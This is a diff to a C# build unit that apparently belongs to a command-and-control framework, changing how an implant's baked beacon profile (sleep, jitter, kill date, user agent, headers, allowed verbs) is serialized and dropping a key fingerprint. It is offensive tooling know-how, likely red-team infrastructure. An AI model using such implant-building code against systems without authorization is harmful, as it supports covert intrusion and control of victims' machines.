@@ -140,14 +140,16 @@ public sealed class DotNetBuildUnit : IBuildUnit
     // Renders the baked profile as a compact JSON map, base64-url-encoded without
     // padding so it is safe to embed verbatim in a C# string literal. This shape
     // is the language-neutral wire contract: any build unit -- a community
-    // Go/C/Nim unit out-of-tree, or this in-tree .NET unit (ADR 0009) -- must emit
-    // the same keys and encoding so an implant of any language decodes the same
-    // profile, and the per-implant key never leaks -- only its fingerprint is
-    // recorded (architecture.md Sec 7). The implant reads its key from the
-    // teamserver at enroll time, not from the baked profile.
+    // Go/C/Nim unit out-of-tree, or this in-tree .NET unit -- must emit the same
+    // keys and encoding so an implant of any language decodes the same profile.
+    // The key set is exactly what the reference implant consumes (its
+    // BakedProfileSupport maps each key), plus the class verb set, which the
+    // planned implant-side capability derivation reads (architecture.md Sec 5.3).
+    // No key material is baked at all: the implant reads its key from the
+    // teamserver at enroll time, not from the baked profile (architecture.md
+    // Sec 7).
     public static string RenderBakedProfile(BuildParams @params)
     {
-        var keyFingerprint = ArtifactFingerprint.Of(Encoding.UTF8.GetBytes(@params.Key));
         // The class's reduced verb set (architecture.md Sec 5.2), comma-joined so
         // the artifact is self-describing: the generated implant carries the verbs
         // it is permitted to run, baked in alongside its profile.
@@ -166,14 +168,12 @@ public sealed class DotNetBuildUnit : IBuildUnit
             ["killDate"] = @params.Beacon.KillDate.ToString("O"),
             ["sleep"] = ((long)@params.Beacon.Sleep.TotalSeconds).ToString() + "s",
             ["jitter"] = ((long)@params.Beacon.Jitter.TotalSeconds).ToString() + "s",
-            ["uriPath"] = @params.Transport.UriPath,
             ["enrollPath"] = @params.Transport.EnrollPath,
             ["userAgent"] = @params.Transport.UserAgent,
             ["headers"] = RenderHeadersMap(@params.Transport.Headers),
             ["requestTimeout"] = ((long)@params.Transport.RequestTimeout.TotalSeconds).ToString() + "s",
             ["envelope"] = @params.Transport.Envelope.ToString().ToLowerInvariant(),
             ["verbs"] = verbs,
-            ["keyFingerprint"] = keyFingerprint,
         };
         var json = JsonSerializer.Serialize(map);
         return Base64Url(Encoding.UTF8.GetBytes(json));
